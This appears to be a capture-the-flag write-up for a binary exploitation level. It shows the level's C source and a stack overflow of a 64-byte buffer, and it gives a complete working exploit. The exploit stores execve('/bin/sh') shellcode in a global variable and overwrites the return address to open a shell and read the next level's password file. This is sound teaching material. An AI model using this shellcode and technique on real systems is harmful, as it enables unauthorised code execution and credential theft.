# Level01

## Reconstructed source

```c
#include <stdio.h>
#include <string.h>

char a_user_name[256];

int verify_user_name(void)
{
    puts("verifying username....");
    return (strcmp(a_user_name, "dat_wil"));
}

int verify_user_pass(char *passwd)
{
    return (strcmp(passwd, "admin"));
}

int main(void)
{
    char buffer[64];
    int check;

    puts("********* ADMIN LOGIN PROMPT *********");
    printf("Enter Username: ");
    fgets(a_user_name, 256, stdin);
    check = verify_user_name();
    if (check != 0)
    {
        puts("nope, incorrect username...");
        return (1);
    }
    puts("Enter Password: ");
    fgets(buffer, 100, stdin);
    check = verify_user_pass(buffer);
    if (check != 0)
    {
        puts("nope, incorrect password...");
        return (1);
    }
    return (0);
}
```

Passing both checks legitimately (`dat_wil` / `admin`) does nothing: `main` just
returns. There is no `system` call in the program, so the level can only be
solved by hijacking control flow.

## Vulnerability

Two weaknesses combine into a stack buffer overflow with a reliable code
landing zone:

1. `fgets(buffer, 100, stdin)` reads up to 99 bytes into `buffer`, which only
   holds ~64 bytes on the stack. Overflowing it overwrites the saved return
   address of `main`, giving control of `eip` when `main` returns.

2. The username is read into the global `a_user_name` at the fixed address
   `0x804a040` (`nm level01 | grep a_user_name`). With `NX disabled` this memory
   is executable, so it is an ideal place to store shellcode at an address known
   ahead of time. `verify_user_name` only compares the first 7 bytes against
   `dat_wil`, so the username can be `"dat_wil" + shellcode`.

## Exploitation

Plan:

```
Username :  "dat_wil" + shellcode        -> shellcode lands at 0x804a040 + 7 = 0x804a047
Password :  80 bytes of padding + 0x804a047 (little-endian) -> overwrites the return address
```

### Step 1 — locate the shellcode landing address

`a_user_name` is a global, so it has a fixed address (`No PIE`). Read it straight
from gdb:

```sh
gdb ./level01
(gdb) p &a_user_name             # $1 = (char (*)[256]) 0x804a040 <a_user_name>
(gdb) info address a_user_name   # Symbol "a_user_name" is static storage at address 0x804a040.
```

The shellcode is prefixed by `"dat_wil"` (7 bytes) to pass `verify_user_name`,
so the entry point to jump to is `0x804a040 + 7 = 0x804a047`.

### Step 2 — measure the overflow offset

The padding length is a runtime value (stack alignment makes it 80..95), so it
is measured once with gdb using distinct 4-byte markers:

```sh
python -c 'print "dat_wil\n" + "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVV"' > /tmp/p
gdb ./level01
(gdb) run < /tmp/p
# Program received signal SIGSEGV
(gdb) info registers eip        # eip = 0x55555555 ("UUUU") -> offset 80
```

The marker string is 22 distinct 4-byte groups (`AAAA` ... `VVVV`). The group
that lands in `eip` tells the offset: `UUUU` is the 21st group, so the saved
return address sits at byte `21 * 4 - 4 = 80` of the password.

Final exploit (25-byte `execve("/bin/sh")` shellcode, no NUL / newline bytes):

```sh
(python -c 'print "dat_wil" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" + "\n" + "A"*80 + "\x47\xa0\x04\x08"'; cat) | ./level01
whoami                              # level02
cat /home/users/level02/.pass
```

`verify_user_pass` fails ("nope, incorrect password..."), but `main` still
returns afterwards and jumps to `0x804a047`, running the shellcode as level02.

